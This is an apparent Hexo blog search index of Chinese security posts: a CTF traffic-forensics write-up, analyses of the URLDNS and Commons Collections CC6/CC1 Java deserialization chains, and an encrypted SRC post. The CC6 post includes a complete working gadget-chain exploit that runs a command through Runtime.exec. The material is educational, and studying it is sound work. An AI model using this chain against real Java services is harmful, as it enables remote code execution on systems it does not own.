<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>记一次从FastAdmin到GetShell</title>
    <link href="/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/"/>
    <url>/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b872261bff1ccb4c42e881f3d55ae078cbfe9fc4ece8147f0126326046fcbaad"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>长城杯初赛MISC</title>
    <link href="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/"/>
    <url>/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/</url>
    
    <content type="html"><![CDATA[<p>闲来无事，花了1h水了两道MISC</p><span id="more"></span><h2 id="漏洞探踪-流量解密"><a href="#漏洞探踪-流量解密" class="headerlink" title="漏洞探踪&流量解密"></a>漏洞探踪&amp;流量解密</h2><h3 id="一阶段"><a href="#一阶段" class="headerlink" title="一阶段"></a>一阶段</h3><p>在流量包中一共有3个IP：</p><p>192.168.30.132；192.168.30.128；192.168.40.141</p><p>明显的是141是web服务的IP</p><p><code>http.response.code==200</code>过滤包，追踪HTTP流，发现存在webshell上传：</p><img src="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/image-20240908144511444.png" class=""><p>使用文件包含实现的getShell</p><img src="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/image-20240908144626790.png" class=""><p>但攻击的发起方是128的IP，却对不上密码；132的IP仅存在目录扫描的行为，也对不上密码。说明还有其他的IP。</p><p>去OA的访问日志找：先把128和132的IP替换为空白，发现存在流量包中没有的IP：233、234、235，全部试了，发现密码是234</p><img src="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/image-20240908145107227.png" class=""><img src="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/image-20240908145130507.png" class=""><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.30.234</span> - - <span class="hljs-string">[04/Sep/2024:22:53:38 +0800]</span> <span class="hljs-string">"<span class="hljs-keyword">POST</span> /ispirit/im/upload.php HTTP/1.1"</span> <span class="hljs-number">200</span> <span class="hljs-number">104</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Outlook/16.0.13929.20296"</span> <span class="hljs-string">"127.0.0.1"</span><br><span class="hljs-number">192.168.30.234</span> - - <span class="hljs-string">[04/Sep/2024:22:54:38 +0800]</span> <span class="hljs-string">"<span class="hljs-keyword">POST</span> /ispirit/interface/gateway.php HTTP/1.1"</span> <span class="hljs-number">200</span> <span class="hljs-number">39</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Outlook/16.0.13929.20296"</span> <span class="hljs-string">"127.0.0.1"</span><br></code></pre></td></tr></table></figure><h3 id="二阶段"><a href="#二阶段" class="headerlink" title="二阶段"></a>二阶段</h3><p><code>http</code>过滤</p><img src="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/image-20240908145359904.png" class=""><p>追踪<code>/key</code>和<code>raw</code>，找到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/key bdb8e21eace81d5fd21ca445ccb35071<br>/raw bdb8e21eace81d5fd21ca445ccb350715a76f6751576dbe1af49328aa1d2d2bea16ef62afa3a7c616dbdb8e21eace81d5fd21ca445ccb35071<br></code></pre></td></tr></table></figure><p>找到提示：RC4解密</p><img src="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/image-20240908145558396.png" class=""><p>得到<code>flag:{welcome to beijing}</code></p><img src="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/image-20240908145622231.png" class=""><h2 id="最安全的加密方式"><a href="#最安全的加密方式" class="headerlink" title="最安全的加密方式"></a>最安全的加密方式</h2><p><code>http</code>过滤，追踪流：发现上传了压缩包</p><img src="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/image-20240908145754345.png" class=""><p>dump出来为：</p><p><code>526172211a070100f3e182eb0b0105070006010180808000304975875502033cc00404a409200e4bdc6b80030008666c61672e747874300100030f20aa2d8a1090a74b0805879d959b353a374086eb57dd537cb6f521a5a480c716e3082ebc4d37a7f19b6a9ec60a03026948f03614dfd8014b71dba6d90e06233df22ec419e4f92b03d420d1bdb94ddb1d9d5bee64e8ff0db02e6e088026d7090ede5c8322965d931c698c7d8609250881833b36ab727fe2977bb2083a3c9a609807cc5abaa1ee9bacab805acf585fa8e4787898ba61cdc9b09f07b6591681802a7329d8a1fb78279db017816c29c53e8808ca2262fe511ef3b7a6d5024ef27170d3242a670da7e0c54273a6710153e7b91a2569036d8ba46750feee6240c21e2868ac203b6ed4a6936ae34dd06bc701141d31c20df791594dc2373dab700a869bc5bb7f1a50c2c0dde5508d2aea3f50f188bef6c0d46c6f22a662ecef8cd81dc405f29117c1dd7cabeee6e78fd29b461c59a63d693c8c72799f505d542d1e350d30679d6fc79476c92ab12096bc863c0d367a014118e96734d712b2544639120228d0c10ffe3deba07fa31ba870342aec44f09afb4b3cddc762fafbecdf0c1e31bc9cb63d4f224b6d477e3056e34ff4365b6d66f2b49ff009d424e0423e0c36ff3eff94726299bb2c22bd5cb4a05f92b6bb761ae1ea4ecd4c24528bb4f064dfc8fcf021364cec02c5c93a7d31828d04cea7cf83e64a9fa4a8f1ba6f755f737725330e4d5247a22374914ab6bea70db52a279a443d194cbfb1e0e7fc339c7a6bc4fc9afb7812dd00dc0623db4cb18e60b72c3ce2969100a9723695de1017062e539448a1d2104beb43969266ef860fe9c95dd9667b90dd81a11f42d549592e32e1ae003f1ae7267c4a66d5b3789776037f4baf82de057a71076c99fad1a309b4ae5301c76fb4b7b851a46b903e7c500ce395607b1cd9da8e1d77565103050400</code></p><p>转换为.rar：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'rar.txt'</span>, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> file:<br>    hex_string = file.read().strip()<br><span class="hljs-comment"># 将每两个字符表示的16进制转换为字节</span><br>byte_data = <span class="hljs-built_in">bytes</span>.fromhex(hex_string)<br><span class="hljs-comment"># 将字节写入新的二进制文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'output.rar'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(byte_data)<br></code></pre></td></tr></table></figure><p>解压缩需要密码：25ming@</p><img src="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/image-20240908150018532.png" class=""><p>得到一个flag.txt，发现是MD5压缩字符，爆破得到：<code>flag{The_m0st_2ecUre_eNcrYption!!!}</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_hash</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(s.encode()).hexdigest()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_md5_table</span>(<span class="hljs-params">char_set</span>):<br>    md5_table = {}<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> char_set:<br>        md5_value = md5_hash(char)<br>        md5_table[md5_value] = char  <span class="hljs-comment"># 将每个字符的MD5值存入字典</span><br>    <span class="hljs-keyword">return</span> md5_table<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_md5_file</span>(<span class="hljs-params">input_file, md5_table</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">'r'</span>, encoding=<span class="hljs-string">'utf-8'</span>) <span class="hljs-keyword">as</span> infile:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> infile:<br>            hash_value = line.strip()  <span class="hljs-comment"># 读取每行的MD5哈希值并去掉换行符</span><br>            <span class="hljs-comment"># 在字典中查找MD5值</span><br>            <span class="hljs-keyword">if</span> hash_value <span class="hljs-keyword">in</span> md5_table:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{md5_table[hash_value]}</span>"</span>,end=<span class="hljs-string">""</span>)<br><span class="hljs-comment"># 字符集：0-9, a-z, A-Z, 和特殊字符!{}_</span><br>char_set = <span class="hljs-string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!{}_'</span><br>crack_md5_file(<span class="hljs-string">"flag.txt"</span>, generate_md5_table(char_set))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>URLDNS链分析</title>
    <link href="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <url>/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>一条简单的反序列化链</p><span id="more"></span><h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><p>从<code>ysoserial</code>的源码开始调试，直接在Github下载其源码导入IDEA，Maven会自动加载需要的包。</p><p>直接看到URLDNS.java的文件，我们关注<code>getObject</code>函数里面的这两个代码，说明使用的是<code>HashMap</code>，并且将URL作为其中的键值对造成的反序列化问题</p><img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904151237155.png" class="" title="image-20240904151237155"><p>为了方便调试，做一下准备，首先进入URL类中，找到hashCode函数，然后点击<code>handler.hashCode()</code>进去，</p><img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904153145840.png" class="" title="image-20240904153145840"><p>在353行处打下断点，这也真是请求DNS解析的地方</p><img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904153240256.png" class="" title="image-20240904153240256"><p>然后回到URLDNS.java中，修改main函数为下面这样：</p><img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904153356053.png" class="" title="image-20240904153356053"><p>然后我们进行调试，<strong>可以发现会多次进入我们打断点的地方但没有发出请求，这是为什么呢，是因为ysoserial自己重写了这个地方</strong>，修改返回值为null所以无事发生。</p><img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904153803170.png" class="" title="image-20240904153803170"><p>大概3次步进，再次到我们打断点的地方，查看调用栈：</p><p><code>HashMap.readObject()-&gt;HashMap.hash()-&gt;URL.hashCode()-&gt;URLStreamHandler.hashCode()</code></p><img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904154018970.png" class="" title="image-20240904154018970"><p>于是我们查看HashMap类，我们知道Java反序列化问题的造成都是因为不安全的重写<code>readObject</code>函数造成的，所以搜索<code>readObject</code>函数</p><p>都是会先调用一个默认的<code>readObject</code>然后后面写自己的逻辑，</p><img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904151737711.png" class=""><p>在1397行的位置，可以看到使用了<code>putVal(hash(key), key, value, false, false);</code>这个语句，对key进行了hash运算，我们这里的key就是URL类，在此处下断点，重新调试。</p><p>步进查看<code>hash</code>这个方法，它是继续调用了<code>key.hashCode()</code>来计算，也就是我们这里的<code>URL.hashCode()</code></p><img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904152213420.png" class="" title="image-20240904152213420"><p>于是继续触发<code>URLStreamHandler.hashCode()</code>，最终到<code>URLStreamHandler.getHostAddress()</code>就发出了DNS请求。</p><img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904155628133.png" class="" title="image-20240904155628133"><p>总的来说，这条链子很简单但很重要，因为它<strong>不需要依赖其他包，仅仅使用了原生的Java包，主要是用来检测是否存在反序列化漏洞</strong>。</p><p><code>HashMap.readObject()</code></p><p><code>-&gt;HashMap.hash()</code></p><p><code>-&gt;URL.hashCode()</code></p><p><code>-&gt;URLStreamHandler.hashCode()</code></p><p><code>-&gt;URLStreamHandler.getHostAddress()</code></p><p><code>-&gt;InetAddress.getByName()</code></p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CC6链</title>
    <link href="/2024/08/19/CC6%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <url>/2024/08/19/CC6%E9%93%BE%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>为了解决高版本Java8中CC1失效的问题，<code>ysoserial</code>中使用了CC6这条链</p><span id="more"></span><p>在Java 8u71以后，<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>的逻辑变化了。这里提供一个高版本的<code>sun</code>包源码<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/file/6bfaecb8ff77/src/share/classes/sun">下载地址</a>，改变后发现原来的CC1就无法弹计算器了。</p><p>在项目源码中可以看到，仍然使用<code>LazyMap</code>作为入口，只不过上层调用变了</p><img src="/2024/08/19/CC6%E9%93%BE%E5%88%86%E6%9E%90/image-20240914152451135.png" class="" title="image-20240914152451135"><p>项目使用的类是<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code>，在其<code>getValue</code>⽅法中调⽤了<code>this.map.get</code>，我们<strong>注意这里的map就需要是我们构造的LazyMap</strong>。那么如何构造<code>TiedMapEntry</code>实例呢，可以看它的构造函数，直接将我们的<code>LazyMap</code>和随便一个key传入即可构造。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Gets the value of this entry direct from the map.</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> the value</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> {<br>    <span class="hljs-keyword">return</span> map.get(key);<br>}<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Constructs a new entry with the given Map and key.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> map  the map</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> key  the key</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> {<br>    <span class="hljs-built_in">super</span>();<br>    <span class="hljs-built_in">this</span>.map = map;<br>    <span class="hljs-built_in">this</span>.key = key;<br>}<br></code></pre></td></tr></table></figure><p>然后在多个函数中调用了<code>getValue</code>方法，但是<code>ysoserial</code>选择的是<code>hashCode()</code>方法，注释也说明了这个方法是<code>MapEntry#hashCode</code>接口的实现，用于返回value的hash值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Gets a hashCode compatible with the equals method.</span><br><span class="hljs-comment"> * &lt;p&gt;</span><br><span class="hljs-comment"> * Implemented per API documentation of {<span class="hljs-doctag">@link</span> java.util.Map.Entry#hashCode()}</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> a suitable hash code</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> {<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getValue();<br>    <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>           (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode()); <br>}<br></code></pre></td></tr></table></figure><p>然后使用了<code>HashMap</code>的<code>hash</code>方法去触发，可以发现是<code>key.hashCode()</code>，说明我们的payload应该作为<code>key</code>，我们<strong>目前构造了<code>TiedMapEntry</code>实例，那么我们下一步就是将其作为<code>key</code>去新构造一个<code>hashMap</code>实例。</strong>然后<code>put</code>方法对<code>hash</code>进行了调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> {<br>    <span class="hljs-type">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>}<br><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> {<br>    <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>}<br></code></pre></td></tr></table></figure><p>最后顶层是<code>HashSet</code>的<code>readObject</code>作为入口，反序列化漏洞大都存在于某个类的<code>readObject</code>中，分析到目前我有一个感受就是，更像是两边向中间衍生，然后刚好链接在一起就出现了漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Read in all elements in the proper order.</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;size; i++) {<br>    <span class="hljs-meta">@SuppressWarnings("unchecked")</span><br>        <span class="hljs-type">E</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> (E) s.readObject();<br>    map.put(e, PRESENT);<span class="hljs-comment">//trigger!</span><br>}<br></code></pre></td></tr></table></figure><p>分析到这里可以写出Exp的内容了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {<br>        Transformer[] fakeFormer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]{<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)};<br>        <span class="hljs-comment">// 第一层</span><br>        Transformer[] tfs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]{<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"getMethod"</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class, Class[].class},<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"getRuntime"</span>, <span class="hljs-literal">null</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"invoke"</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Object.class, Object[].class},<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)<br>        };<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeFormer);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(),transformerChain);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">"key"</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">tiedMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        tiedMap.put(tiedMapEntry,<span class="hljs-string">"Exp"</span>);<br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">hashSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>(<span class="hljs-number">1</span>);<br>        hashSet.add(tiedMap);<br>        lazyMap.remove(<span class="hljs-string">"key"</span>);<br><span class="hljs-comment">//        反射修改变量</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">"iTransformers"</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, tfs);<br><br>        <span class="hljs-comment">// 测试</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(hashSet);<br>        oos.close();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        ois.readObject();<br>    }<br>}<br></code></pre></td></tr></table></figure><p>这其中有个非常关键的代码<code>lazyMap.remove("key");</code>， 为什么要移除，看到<code>LazyMap.get()</code>的代码：</p><p><strong>存在一个是否含有键值的判断，而我们的key在构造<code>TiedMapEntry</code>的时候就被固定下来了，除非你用反射去修改，但是没有必要，直接在<code>lazyMap</code>中把<code>key</code>的键值对给去除就行</strong>。</p><img src="/2024/08/19/CC6%E9%93%BE%E5%88%86%E6%9E%90/image-20240914220207010.png" class="" title="image-20240914220207010"><p>最后捋一捋，</p><p><code>LazyMap</code>作为CC6的一个转折点，往下已经分析过多次。</p><p>往上走，使用<code>LazyMap</code>构造了一个<code>TiedMapEntry</code>实例，目的是为了使用<code>LazyMap.get()</code></p><p>再用<code>TiedMapEntry</code>作为了一个新的<code>HashMap</code>的<code>key</code>值，目的是为了触发<code>key.hashCode()</code></p><p>最后用<code>HashSet</code>包裹，目的是为了使用其<code>readObject</code>方法来触发<code>map.put()</code>，从而进入<code>hash(key)-&gt;key.hashCode()</code></p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CC1链lazyMap</title>
    <link href="/2024/08/13/CC1%E9%93%BElazyMap/"/>
    <url>/2024/08/13/CC1%E9%93%BElazyMap/</url>
    
    <content type="html"><![CDATA[<p>之前分析了<code>TransformMap</code>那条链，现在分析一下<code>LazyMap</code></p><span id="more"></span><p><code>LazyMap</code>这条链子是<code>ysoserial</code>在使用，其同样在<code>org.apache.commons.collections.map</code>路径下，我在其源码中可以看到，在<code>get</code>方法中调用了<code>transform()</code>这个函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> {<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) {<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    }<br>    <span class="hljs-keyword">return</span> 